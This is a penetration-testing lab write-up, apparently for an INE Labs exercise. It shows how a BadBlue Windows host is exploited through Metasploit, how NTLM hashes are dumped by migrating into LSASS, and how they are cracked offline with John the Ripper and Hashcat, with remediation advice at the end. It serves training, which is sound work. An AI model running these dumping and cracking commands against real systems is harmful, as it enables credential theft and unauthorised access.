---
title: "Windows: NTLM Hash Cracking"
description: "Dumping NTLM hashes from a BadBlue-compromised Windows host (hashdump via LSASS) and cracking them offline with both John the Ripper and Hashcat (mode 1000) to recover the Administrator and Bob passwords."
date: 2025-12-11
platform: "INE Labs"
difficulty: "Medium"
tags: ["Windows", "NTLM", "Hash Cracking", "John the Ripper", "Hashcat", "hashdump", "BadBlue"]
cover: "./photo4.png"
---

# Windows: NTLM Hash Cracking

**Classification:** Host & Network Penetration Testing / Post-Exploitation<br>
**Target:** Windows host (Meterpreter via BadBlue)

**Flags**
- Administrator password: `password`
- Bob password: `password1`

## 1. Executive Summary

After exploiting **BadBlue** and migrating into LSASS, we dump the SAM NTLM hashes with
`hashdump`, save them, and crack them offline two ways — **John the Ripper** and **Hashcat**
(hash mode 1000, NTLM) — recovering the Administrator and Bob passwords.

## 2. Foothold & Hash Dump

```bash
db_nmap -sV <target>
use exploit/windows/http/badblue_passthru
exploit
```

![Nmap scan](./photo1.png)

![BadBlue exploited](./photo2.png)

```bash
migrate <lsass pid>
```

![Migrated into LSASS](./photo3.png)

```bash
hashdump
```

![hashdump — NTLM hashes](./photo4.png)

Saving the Administrator and Bob hashes to a file.

![Hashes saved to a file](./photo5.png)

## 3. Cracking with John the Ripper

```bash
john --list=formats | grep -i nt
john --format=NT --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt
```

![John — NTLM formats](./photo6.png)

![John configured](./photo7.png)

Both passwords are recovered.

```
Administrator : password
Bob           : password1
```

![John — cracked](./photo8.png)

## 4. Cracking with Hashcat

```bash
hashcat --help | grep -i ntlm     # mode 1000
hashcat -m 1000 -a 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

![Hashcat — NTLM mode 1000](./photo9.png)

![Hashcat attack mode](./photo10.png)

![Running the attack](./photo11.png)

![Hashes cracked (1)](./photo12.png)

![Hashes cracked (2)](./photo13.png)

## 5. Remediation Recommendations

1. **Enforce strong, long passwords** — both fell instantly to a wordlist; NTLM is fast to
   crack.
2. **Protect the SAM/LSASS** (Credential Guard, LSA Protection) to prevent hash dumping.
3. **Monitor** for LSASS access/dumping and rotate exposed credentials; use LAPS for local
   admin.
